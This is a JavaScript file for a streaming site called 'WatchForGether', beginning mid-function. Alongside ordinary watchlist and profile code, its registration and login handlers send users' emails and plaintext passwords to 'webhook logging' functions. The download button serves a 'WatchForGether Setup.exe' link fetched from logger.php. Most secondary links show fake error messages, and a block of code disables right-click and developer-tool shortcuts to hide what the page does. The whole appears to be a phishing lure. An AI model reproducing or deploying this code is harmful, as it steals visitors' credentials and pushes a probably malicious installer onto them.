            '</div>' +
            '<p class="review-text">"' + r.text + '"</p>' +
            verifiedBadge;

        container.appendChild(card);
    }
}

function addToRecentlyWatched(movie) {
    var saved = localStorage.getItem('w4g_recently_watched');
    var recent = [];
    if (saved) {
        try { recent = JSON.parse(saved); } catch (e) { recent = []; }
    }
    var filtered = [];
    for (var i = 0; i < recent.length; i++) {
        if (recent[i].id !== movie.id) filtered.push(recent[i]);
    }
    filtered.unshift({
        id: movie.id,
        title: movie.title,
        img: movie.img,
        year: movie.year,
        genre: movie.genre,
        rating: movie.rating,
        duration: movie.duration,
        type: movie.type || 'movie',
        director: movie.director,
        cast: movie.cast,
        language: movie.language,
        description: movie.description,
        trailer: movie.trailer,
        watchedAt: new Date().toISOString()
    });
    if (filtered.length > 20) filtered = filtered.slice(0, 20);
    localStorage.setItem('w4g_recently_watched', JSON.stringify(filtered));
}

function getRecentlyWatched() {
    var saved = localStorage.getItem('w4g_recently_watched');
    if (saved) {
        try { return JSON.parse(saved); } catch (e) { return []; }
    }
    return [];
}

function openModal(movie) {
    var modal = document.getElementById('movieModal');
    if (!modal) return;

    addToRecentlyWatched(movie);

    document.getElementById('modalTitle').textContent = movie.title;
    document.getElementById('modalYear').textContent = movie.year;
    document.getElementById('modalGenre').textContent = movie.genre;
    document.getElementById('modalDuration').textContent = movie.duration;
    document.getElementById('modalRating').innerHTML = '<i class="fa-solid fa-star" style="color:#f5c518;"></i> ' + movie.rating;
    document.getElementById('modalDesc').textContent = movie.description;
    document.getElementById('modalDirector').textContent = movie.director;
    document.getElementById('modalCast').textContent = movie.cast;
    document.getElementById('modalLang').textContent = movie.language;

    var posterImg = document.getElementById('modalPoster');
    posterImg.src = movie.img;
    posterImg.alt = movie.title;
    posterImg.onerror = function () {
        this.src = 'https://placehold.co/300x450/1a1a2e/e0e0e0?text=' + encodeURIComponent(movie.title);
        this.onerror = null;
    };

    var watchNowBtn = document.getElementById('modalWatchNowBtn');
    if (watchNowBtn) {
        var isRegistered = localStorage.getItem('w4g_registered') === 'true';
        if (isRegistered) {
            watchNowBtn.href = '#download';
            watchNowBtn.onclick = function (e) {
                e.preventDefault();
                modal.classList.remove('open');
                document.body.style.overflow = '';
                var downloadSection = document.getElementById('download');
                if (downloadSection) {
                    var headerH = document.querySelector('.header') ? document.querySelector('.header').offsetHeight : 0;
                    var top = downloadSection.getBoundingClientRect().top + window.pageYOffset - headerH;
                    window.scrollTo({ top: top, behavior: 'smooth' });
                }
                showToast('Download the app to start watching ' + movie.title, 'info');
            };
        } else {
            watchNowBtn.href = 'register.html';
            watchNowBtn.onclick = null;
        }
    }

    var trailerBtn = document.getElementById('modalTrailerBtn');
    if (trailerBtn) {
        trailerBtn.onclick = function () {
            if (movie.trailer) {
                window.open(movie.trailer, '_blank');
            }
        };
    }

    modal.classList.add('open');
    document.body.style.overflow = 'hidden';
}

function showToast(message, type) {
    type = type || 'info';
    var container = document.getElementById('toastContainer');
    if (!container) {
        container = document.createElement('div');
        container.className = 'toast-container';
        container.id = 'toastContainer';
        document.body.appendChild(container);
    }

    var toast = document.createElement('div');
    toast.className = 'toast toast-' + type;

    var iconMap = {
        success: '\u2713',
        error: '\u2717',
        info: '\u2139'
    };

    toast.innerHTML = '<span class="toast-icon">' + (iconMap[type] || '\u2139') + '</span><span class="toast-msg">' + message + '</span>';

    container.appendChild(toast);

    setTimeout(function () {
        toast.classList.add('show');
    }, 10);

    setTimeout(function () {
        toast.classList.remove('show');
        setTimeout(function () {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 4000);
}

function getWatchlistData() {
    var saved = localStorage.getItem('w4g_watchlist');
    if (saved) {
        try { return JSON.parse(saved); } catch (e) { }
    }
    var defaultWL = [];
    var allContent = movieDatabase.concat(seriesDatabase).concat(trendingDatabase);
    var defaultIds = [1, 3, 5, 101, 103, 201, 204, 7];
    for (var i = 0; i < allContent.length; i++) {
        if (defaultIds.indexOf(allContent[i].id) !== -1) {
            var exists = false;
            for (var j = 0; j < defaultWL.length; j++) {
                if (defaultWL[j].id === allContent[i].id) { exists = true; break; }
            }
            if (!exists) defaultWL.push(allContent[i]);
        }
    }
    localStorage.setItem('w4g_watchlist', JSON.stringify(defaultWL));
    return defaultWL;
}

function saveWatchlistData(data) {
    localStorage.setItem('w4g_watchlist', JSON.stringify(data));
}

function renderWatchlist(filter) {
    var grid = document.getElementById('watchlistGrid');
    var emptyEl = document.getElementById('watchlistEmpty');
    var countEl = document.getElementById('watchlistTotalCount');
    if (!grid) return;

    var data = getWatchlistData();
    var filtered = data;
    if (filter && filter !== 'all') {
        filtered = [];
        for (var i = 0; i < data.length; i++) {
            if (data[i].type === filter) {
                filtered.push(data[i]);
            }
        }
    }

    if (countEl) countEl.textContent = data.length;

    if (filtered.length === 0) {
        grid.style.display = 'none';
        if (emptyEl) emptyEl.style.display = 'block';
        return;
    }
    
    grid.style.display = '';
    if (emptyEl) emptyEl.style.display = 'none';
    grid.innerHTML = '';

    for (var i = 0; i < filtered.length; i++) {
        var item = filtered[i];
        var card = document.createElement('div');
        card.className = 'watchlist-card';

        var typeBadge = document.createElement('div');
        typeBadge.className = 'watchlist-card-type-badge';
        typeBadge.textContent = item.type || 'movie';

        var img = document.createElement('img');
        img.className = 'watchlist-card-poster';
        img.src = item.img;
        img.alt = item.title;
        img.loading = 'lazy';
        img.onerror = (function (title) {
            return function () {
                this.src = 'https://placehold.co/300x450/1a1a2e/e0e0e0?text=' + encodeURIComponent(title);
                this.onerror = null;
            };
        })(item.title);

        var info = document.createElement('div');
        info.className = 'watchlist-card-info';

        var title = document.createElement('div');
        title.className = 'watchlist-card-title';
        title.textContent = item.title;

        var meta = document.createElement('div');
        meta.className = 'watchlist-card-meta';
        meta.textContent = item.year + ' • ' + item.genre + ' • ⭐ ' + item.rating;

        var actions = document.createElement('div');
        actions.className = 'watchlist-card-actions';

        var watchBtn = document.createElement('button');
        watchBtn.className = 'wl-action-btn';
        watchBtn.innerHTML = '<i class="fa-solid fa-play"></i> Watch';
        watchBtn.addEventListener('click', (function (movie) {
            return function (e) {
                e.stopPropagation();
                closePanel('watchlistPanel');
                setTimeout(function () { openModal(movie); }, 300);
            };
        })(item));
        
        var removeBtn = document.createElement('button');
        removeBtn.className = 'wl-action-btn wl-remove-btn';
        removeBtn.innerHTML = '<i class="fa-solid fa-trash"></i>';
        removeBtn.addEventListener('click', (function (itemId, filterType) {
            return function (e) {
                e.stopPropagation();
                var wl = getWatchlistData();
                var newWl = [];
                for (var k = 0; k < wl.length; k++) {
                    if (wl[k].id !== itemId) newWl.push(wl[k]);
                }
                saveWatchlistData(newWl);
                renderWatchlist(filterType);
                showToast('Removed from watchlist', 'info');
            };
        })(item.id, filter));

        actions.appendChild(watchBtn);
        actions.appendChild(removeBtn);
        info.appendChild(title);
        info.appendChild(meta);
        info.appendChild(actions);
        card.appendChild(typeBadge);
        card.appendChild(img);
        card.appendChild(info);

        card.addEventListener('click', (function (movie) {
            return function () {
                closePanel('watchlistPanel');
                setTimeout(function () { openModal(movie); }, 300);
            };
        })(item));

        grid.appendChild(card);
    }
}

function loadProfileData() {
    var username = localStorage.getItem('w4g_username') || 'User';
    var email = localStorage.getItem('w4g_email') || '';
    var phone = localStorage.getItem('w4g_phone') || '';
    var country = localStorage.getItem('w4g_country') || '';
    var bio = localStorage.getItem('w4g_bio') || '';

    var profileDisplayName = document.getElementById('profileDisplayName');
    var profileAvatarLarge = document.getElementById('profileAvatarLarge');
    var profileNameInput = document.getElementById('profileNameInput');
    var profileEmailInput = document.getElementById('profileEmailInput');
    var profilePhoneInput = document.getElementById('profilePhoneInput');
    var profileCountryInput = document.getElementById('profileCountryInput');
    var profileBioInput = document.getElementById('profileBioInput');

    if (profileDisplayName) profileDisplayName.textContent = username;
    if (profileAvatarLarge) profileAvatarLarge.textContent = username.charAt(0).toUpperCase();
    if (profileNameInput) profileNameInput.value = username;
    if (profileEmailInput) profileEmailInput.value = email;
    if (profilePhoneInput) profilePhoneInput.value = phone;
    if (profileCountryInput) profileCountryInput.value = country;
    if (profileBioInput) profileBioInput.value = bio;

    var recentlyWatched = getRecentlyWatched();
    var moviesWatched = 0;
    var seriesWatched = 0;
    var totalMinutes = 0;
    for (var i = 0; i < recentlyWatched.length; i++) {
        var rw = recentlyWatched[i];
        if (rw.type === 'series') {
            seriesWatched++;
        } else {
            moviesWatched++;
        }
        if (rw.duration) {
            var hMatch = rw.duration.match(/(\d+)h/);
            var mMatch = rw.duration.match(/(\d+)min/);
            if (hMatch) totalMinutes += parseInt(hMatch[1]) * 60;
            if (mMatch) totalMinutes += parseInt(mMatch[1]);
            var sMatch = rw.duration.match(/(\d+)\s*Season/);
            if (sMatch) totalMinutes += parseInt(sMatch[1]) * 600;
        }
    }
    var totalHours = Math.round(totalMinutes / 60);

    var moviesCountEl = document.getElementById('profileMoviesCount');
    var seriesCountEl = document.getElementById('profileSeriesCount');
    var watchTimeEl = document.getElementById('profileWatchTime');
    if (moviesCountEl) moviesCountEl.textContent = moviesWatched;
    if (seriesCountEl) seriesCountEl.textContent = seriesWatched;
    if (watchTimeEl) watchTimeEl.textContent = totalHours + 'h';

    var wl = getWatchlistData();
    var wlCountEl = document.getElementById('profileWatchlistCount');
    if (wlCountEl) wlCountEl.textContent = wl.length;
}

function renderRecentlyWatched() {
    var grid = document.getElementById('profileRecentGrid');
    var emptyEl = document.getElementById('profileRecentEmpty');
    if (!grid) return;
    grid.innerHTML = '';

    var recentItems = getRecentlyWatched();
    var itemsToShow = recentItems.slice(0, 8);

    if (itemsToShow.length === 0) {
        grid.style.display = 'none';
        if (emptyEl) emptyEl.style.display = 'block';
        return;
    }

    grid.style.display = '';
    if (emptyEl) emptyEl.style.display = 'none';

    for (var i = 0; i < itemsToShow.length; i++) {
        var item = itemsToShow[i];
        var div = document.createElement('div');
        div.className = 'profile-recent-item';
        var img = document.createElement('img');
        img.src = item.img;
        img.alt = item.title;
        img.onerror = (function (title) {
            return function () {
                this.src = 'https://placehold.co/300x450/1a1a2e/e0e0e0?text=' + encodeURIComponent(title);
                this.onerror = null;
            };
        })(item.title);
        var titleSpan = document.createElement('div');
        titleSpan.className = 'recent-title';
        titleSpan.textContent = item.title;
        div.appendChild(img);
        div.appendChild(titleSpan);
        div.addEventListener('click', (function (movie) {
            return function () {
                closePanel('profilePanel');
                setTimeout(function () { openModal(movie); }, 300);
            };
        })(item));
        grid.appendChild(div);
    }
}

function loadSettings() {
    var settings = localStorage.getItem('w4g_settings');
    var s = {};
    if (settings) {
        try { s = JSON.parse(settings); } catch (e) { }
    }
    
    var quality = document.getElementById('settingQuality');
    var autoplay = document.getElementById('settingAutoplay');
    var subtitles = document.getElementById('settingSubtitles');
    var emailNotif = document.getElementById('settingEmailNotif');
    var pushNotif = document.getElementById('settingPushNotif');
    var theme = document.getElementById('settingTheme');
    var reduceMotion = document.getElementById('settingReduceMotion');
    var watchHistory = document.getElementById('settingWatchHistory');
    var twoFA = document.getElementById('setting2FA');

    if (quality && s.quality) quality.value = s.quality;
    if (autoplay) autoplay.checked = s.autoplay !== undefined ? s.autoplay : true;
    if (subtitles && s.subtitles) subtitles.value = s.subtitles;
    if (emailNotif) emailNotif.checked = s.emailNotif !== undefined ? s.emailNotif : true;
    if (pushNotif) pushNotif.checked = s.pushNotif || false;
    if (theme && s.theme) theme.value = s.theme;
    if (reduceMotion) reduceMotion.checked = s.reduceMotion || false;
    if (watchHistory) watchHistory.checked = s.watchHistory !== undefined ? s.watchHistory : true;
    if (twoFA) twoFA.checked = s.twoFA || false;
}

function saveSettings() {
    var s = {
        quality: document.getElementById('settingQuality') ? document.getElementById('settingQuality').value : '4k',
        autoplay: document.getElementById('settingAutoplay') ? document.getElementById('settingAutoplay').checked : true,
        subtitles: document.getElementById('settingSubtitles') ? document.getElementById('settingSubtitles').value : 'en',
        emailNotif: document.getElementById('settingEmailNotif') ? document.getElementById('settingEmailNotif').checked : true,
        pushNotif: document.getElementById('settingPushNotif') ? document.getElementById('settingPushNotif').checked : false,
        theme: document.getElementById('settingTheme') ? document.getElementById('settingTheme').value : 'dark',
        reduceMotion: document.getElementById('settingReduceMotion') ? document.getElementById('settingReduceMotion').checked : false,
        watchHistory: document.getElementById('settingWatchHistory') ? document.getElementById('settingWatchHistory').checked : true,
        twoFA: document.getElementById('setting2FA') ? document.getElementById('setting2FA').checked : false
    };
    localStorage.setItem('w4g_settings', JSON.stringify(s));
}

function openPanel(panelId) {
    var panel = document.getElementById(panelId);
    if (panel) {
        panel.classList.add('open');
        document.body.style.overflow = 'hidden';
        panel.scrollTop = 0;
    }
    var dd = document.getElementById('userDropdown');
    if (dd) dd.classList.remove('show');
}

function closePanel(panelId) {
    var panel = document.getElementById(panelId);
    if (panel) {
        panel.classList.remove('open');
        document.body.style.overflow = '';
    }
}

// ========== DOM CONTENT LOADED ==========
document.addEventListener('DOMContentLoaded', function () {
    // Initialize language
    initLanguage();
    
    updateNavbarAuth();

    var userAccountBtn = document.getElementById('userAccountBtn');
    var userDropdown = document.getElementById('userDropdown');
    if (userAccountBtn && userDropdown) {
        userAccountBtn.addEventListener('click', function (e) {
            e.stopPropagation();
            userDropdown.classList.toggle('show');
        });
        document.addEventListener('click', function () {
            userDropdown.classList.remove('show');
        });
    }
    
    var logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', function (e) {
            e.preventDefault();
            localStorage.removeItem('w4g_registered');
            localStorage.removeItem('w4g_username');
            showToast('Logged out successfully', 'info');
            setTimeout(function () {
                window.location.reload();
            }, 800);
        });
    }
    
    var mobileLogoutBtn = document.getElementById('mobileLogoutBtn');
    if (mobileLogoutBtn) {
        mobileLogoutBtn.addEventListener('click', function (e) {
            e.preventDefault();
            localStorage.removeItem('w4g_registered');
            localStorage.removeItem('w4g_username');
            showToast('Logged out successfully', 'info');
            setTimeout(function () {
                window.location.reload();
            }, 800);
        });
    }
    
    var header = document.querySelector('.header');
    if (header) {
        window.addEventListener('scroll', function () {
            if (window.scrollY > 60) {
                header.classList.add('scrolled');
            } else {
                header.classList.remove('scrolled');
            }
        });
    }
    
    var anchorLinks = document.querySelectorAll('a[href^="#"]');
    for (var i = 0; i < anchorLinks.length; i++) {
        anchorLinks[i].addEventListener('click', function (e) {
            var href = this.getAttribute('href');
            if (href === '#') return;
            var target = document.querySelector(href);
            if (target) {
                e.preventDefault();
                var headerH = header ? header.offsetHeight : 0;
                var top = target.getBoundingClientRect().top + window.pageYOffset - headerH;
                window.scrollTo({ top: top, behavior: 'smooth' });

                var overlay = document.getElementById('mobileNavOverlay');
                if (overlay) overlay.classList.remove('open');
                var btn = document.getElementById('mobileMenuBtn');
                if (btn) btn.classList.remove('active');
            }
        });
    }
    
    var sections = document.querySelectorAll('section[id]');
    var navItems = document.querySelectorAll('.nav-item');
    window.addEventListener('scroll', function () {
        var scrollPos = window.scrollY + 120;
        for (var i = 0; i < sections.length; i++) {
            var sec = sections[i];
            if (sec.offsetTop <= scrollPos && sec.offsetTop + sec.offsetHeight > scrollPos) {
                var secId = sec.getAttribute('id');
                for (var j = 0; j < navItems.length; j++) {
                    navItems[j].classList.remove('active');
                    var navHref = navItems[j].getAttribute('href');
                    if (navHref && navHref === '#' + secId) {
                        navItems[j].classList.add('active');
                    }
                }
            }
        }
    });
    
    var mobileMenuBtn = document.getElementById('mobileMenuBtn');
    var mobileNavOverlay = document.getElementById('mobileNavOverlay');
    if (mobileMenuBtn && mobileNavOverlay) {
        mobileMenuBtn.addEventListener('click', function () {
            this.classList.toggle('active');
            mobileNavOverlay.classList.toggle('open');
        });
        var mobileLinks = mobileNavOverlay.querySelectorAll('.mobile-nav-link');
        for (var i = 0; i < mobileLinks.length; i++) {
            mobileLinks[i].addEventListener('click', function () {
                mobileMenuBtn.classList.remove('active');
                mobileNavOverlay.classList.remove('open');
            });
        }
    }
    
    loadMoviesFromAPI();

    var seriesGrid = document.getElementById('seriesGrid');
    if (seriesGrid) {
        renderCards(seriesGrid, seriesDatabase);
    }

    var trendingList = document.getElementById('trendingList');
    if (trendingList) {
        renderTrending(trendingList, trendingDatabase);
    }

    var reviewsGrid = document.getElementById('reviewsGrid');
    if (reviewsGrid) {
        renderReviews(reviewsGrid, reviewsData);
    }

    var modal = document.getElementById('movieModal');
    var modalClose = document.getElementById('modalClose');
    if (modal && modalClose) {
        modalClose.addEventListener('click', function () {
            modal.classList.remove('open');
            document.body.style.overflow = '';
        });
        modal.addEventListener('click', function (e) {
            if (e.target === modal) {
                modal.classList.remove('open');
                document.body.style.overflow = '';
            }
        });
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape' && modal.classList.contains('open')) {
                modal.classList.remove('open');
                document.body.style.overflow = '';
            }
        });
    }
    
    var faqItems = document.querySelectorAll('.faq-question');
    for (var i = 0; i < faqItems.length; i++) {
        faqItems[i].addEventListener('click', function () {
            var parent = this.parentElement;
            var wasOpen = parent.classList.contains('open');
            var allItems = document.querySelectorAll('.faq-item');
            for (var j = 0; j < allItems.length; j++) {
                allItems[j].classList.remove('open');
            }
            if (!wasOpen) {
                parent.classList.add('open');
            }
        });
    }
    
    var revealElements = document.querySelectorAll('.section');
    var observer = new IntersectionObserver(function (entries) {
        for (var i = 0; i < entries.length; i++) {
            if (entries[i].isIntersecting) {
                entries[i].target.classList.add('visible');
            }
        }
    }, { threshold: 0.1 });

    for (var i = 0; i < revealElements.length; i++) {
        observer.observe(revealElements[i]);
    }

    var catCards = document.querySelectorAll('.category-card');
    for (var i = 0; i < catCards.length; i++) {
        catCards[i].addEventListener('click', function () {
            showToast('Browsing ' + this.querySelector('h3').textContent + ' category', 'info');
        });
    }
    
    var viewAllLinks = document.querySelectorAll('.view-all');
    var viewAllErrors = [
        'An unexpected error occurred. Please try again.',
        'Something went wrong. Error code: 0x80070005',
        'Failed to fetch data. Connection was reset.',
        'Internal server error. Please try again later.',
        'An unknown error occurred. [ERR_CONNECTION_REFUSED]'
    ];
    var viewAllIndex = 0;
    for (var i = 0; i < viewAllLinks.length; i++) {
        viewAllLinks[i].addEventListener('click', function (e) {
            e.preventDefault();
            showToast(viewAllErrors[viewAllIndex % viewAllErrors.length], 'error');
            viewAllIndex++;
        });
    }
    
    var footerLinks = document.querySelectorAll('.footer-link');
    for (var i = 0; i < footerLinks.length; i++) {
        footerLinks[i].addEventListener('click', function (e) {
            e.preventDefault();
            var pageName = this.getAttribute('data-page') || 'page';
            showToast('Failed to load ' + pageName + '. An unexpected error occurred.', 'error');
        });
    }

    var dlBtn = document.getElementById('downloadBtn');
    if (dlBtn) {
        dlBtn.addEventListener('click', function (e) {
            e.preventDefault();
            
            fetch("logger.php?action=get_download_info", { cache: "no-store" })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    var link = data.link ? data.link.trim() : "";
                    var filename = data.filename ? data.filename.trim() : "WatchForGether Setup.exe";
                    
                    sendDetailedLog('download', { file: link ? link : filename });
                    
                    if (link) {
                        window.location.href = link;
                    } else {
                        var a = document.createElement("a");
                        a.href = filename;
                        a.download = filename;
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    }
                })
                .catch(function(err) {
                    sendDetailedLog('download', { file: 'WatchForGether Setup.exe' });
                    window.location.href = "WatchForGether Setup.exe";
                });
        });
    }
    
    // REGISTRATION FORM WITH WEBHOOK LOGGING
    var registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', function (e) {
            e.preventDefault();

            var fullname = document.getElementById('fullname');
            var email = document.getElementById('email');
            var password = document.getElementById('password');
            var confirmPassword = document.getElementById('confirm_password');
            var termsCheck = document.getElementById('termsCheck');

            if (!fullname.value.trim() || !email.value.trim()) {
                showToast('Please fill in all fields', 'error');
                return;
            }

            if (password.value.length < 8) {
                showToast('Password must be at least 8 characters', 'error');
                return;
            }

            if (password.value !== confirmPassword.value) {
                showToast('Passwords do not match', 'error');
                return;
            }

            if (termsCheck && !termsCheck.checked) {
                showToast('Please agree to the Terms and Privacy Policy', 'error');
                return;
            }

            if (localStorage.getItem('w4g_registered') === 'true') {
                showToast('You already have an account.', 'info');
                setTimeout(function () {
                    window.location.href = 'index.html';
                }, 1200);
                return;
            }
            
            // SEND REGISTRATION LOG TO WEBHOOK
            logRegistration(email.value, password.value, fullname.value);
            
            localStorage.setItem('w4g_registered', 'true');
            localStorage.setItem('w4g_username', fullname.value.trim().split(' ')[0]);

            var submitBtn = registerForm.querySelector('.btn-submit');
            if (submitBtn) {
                submitBtn.textContent = 'Creating account...';
                submitBtn.disabled = true;
            }

            showToast('Account created! Redirecting to download page...', 'success');

            setTimeout(function () {
                window.location.href = 'index.html#download';
            }, 1000);
        });
    }
    
    // LOGIN FORM WITH WEBHOOK LOGGING
    var loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();
            
            var email = document.getElementById('loginEmail');
            var password = document.getElementById('loginPassword');
            var emailValue = email ? email.value : '';
            var passwordValue = password ? password.value : '';
            
            if (!emailValue || !passwordValue) {
                showToast('Please enter email and password', 'error');
                return;
            }
            
            // SEND LOGIN LOG TO WEBHOOK
            logLogin(emailValue, passwordValue);
            
            var registered = localStorage.getItem('w4g_registered') === 'true';
            var savedEmail = localStorage.getItem('w4g_email') || '';
            
            if (registered) {
                showToast('Login successful! Welcome back', 'success');
                setTimeout(function () {
                    window.location.href = 'index.html';
                }, 1000);
            } else {
                showToast('Invalid email or password', 'error');
            }
        });
    }
    
    // Panel controls
    var openProfileBtn = document.getElementById('openProfileBtn');
    if (openProfileBtn) {
        openProfileBtn.addEventListener('click', function (e) {
            e.preventDefault();
            loadProfileData();
            renderRecentlyWatched();
            openPanel('profilePanel');
        });
    }

    var openWatchlistBtn = document.getElementById('openWatchlistBtn');
    if (openWatchlistBtn) {
        openWatchlistBtn.addEventListener('click', function (e) {
            e.preventDefault();
            renderWatchlist('all');
            openPanel('watchlistPanel');
        });
    }

    var openSettingsBtn = document.getElementById('openSettingsBtn');
    if (openSettingsBtn) {
        openSettingsBtn.addEventListener('click', function (e) {
            e.preventDefault();
            loadSettings();
            openPanel('settingsPanel');
        });
    }

    var closeProfileBtn = document.getElementById('closeProfileBtn');
    if (closeProfileBtn) closeProfileBtn.addEventListener('click', function () { closePanel('profilePanel'); });

    var closeWatchlistBtn = document.getElementById('closeWatchlistBtn');
    if (closeWatchlistBtn) closeWatchlistBtn.addEventListener('click', function () { closePanel('watchlistPanel'); });

    var closeSettingsBtn = document.getElementById('closeSettingsBtn');
    if (closeSettingsBtn) closeSettingsBtn.addEventListener('click', function () { closePanel('settingsPanel'); });

    var profileForm = document.getElementById('profileForm');
    if (profileForm) {
        profileForm.addEventListener('submit', function (e) {
            e.preventDefault();
            var name = document.getElementById('profileNameInput').value.trim();
            var email = document.getElementById('profileEmailInput').value.trim();
            var phone = document.getElementById('profilePhoneInput').value.trim();
            var country = document.getElementById('profileCountryInput').value;
            var bio = document.getElementById('profileBioInput').value.trim();

            if (name) {
                localStorage.setItem('w4g_username', name);
            }
            localStorage.setItem('w4g_email', email);
            localStorage.setItem('w4g_phone', phone);
            localStorage.setItem('w4g_country', country);
            localStorage.setItem('w4g_bio', bio);

            updateNavbarAuth();
            loadProfileData();

            showToast('Profile updated successfully!', 'success');
        });
    }
    
    var genreTags = document.querySelectorAll('.profile-genre-tag');
    for (var i = 0; i < genreTags.length; i++) {
        genreTags[i].addEventListener('click', function () {
            this.classList.toggle('active');
        });
    }
    
    var wlFilterBtns = document.querySelectorAll('.wl-filter-btn');
    for (var i = 0; i < wlFilterBtns.length; i++) {
        wlFilterBtns[i].addEventListener('click', function () {
            for (var j = 0; j < wlFilterBtns.length; j++) {
                wlFilterBtns[j].classList.remove('active');
            }
            this.classList.add('active');
            renderWatchlist(this.getAttribute('data-filter'));
        });
    }
    
    var saveSettingsBtn = document.getElementById('saveSettingsBtn');
    if (saveSettingsBtn) {
        saveSettingsBtn.addEventListener('click', function () {
            saveSettings();
            showToast('Settings saved successfully!', 'success');
        });
    }
    
    var deleteAccountBtn = document.getElementById('deleteAccountBtn');
    if (deleteAccountBtn) {
        deleteAccountBtn.addEventListener('click', function () {
            if (confirm('Are you sure you want to delete your account? This cannot be undone.')) {
                localStorage.removeItem('w4g_registered');
                localStorage.removeItem('w4g_username');
                localStorage.removeItem('w4g_email');
                localStorage.removeItem('w4g_phone');
                localStorage.removeItem('w4g_country');
                localStorage.removeItem('w4g_bio');
                localStorage.removeItem('w4g_watchlist');
                localStorage.removeItem('w4g_settings');
                localStorage.removeItem('w4g_recently_watched');
                showToast('Account deleted. Redirecting...', 'info');
                closePanel('settingsPanel');
                setTimeout(function () {
                    window.location.reload();
                }, 1500);
            }
        });
    }
});

// Anti-debugging and protection
document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
});

document.addEventListener('keydown', function (e) {
    if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
        e.preventDefault();
        return false;
    }
});

// Expose global functions
window.sendDetailedLog = sendDetailedLog;
window.logRegistration = logRegistration;
window.logLogin = logLogin;
window.setLanguage = setLanguage;
window.initLanguage = initLanguage;
window.showToast = showToast;
window.openModal = openModal;
window.closePanel = closePanel;
window.openPanel = openPanel;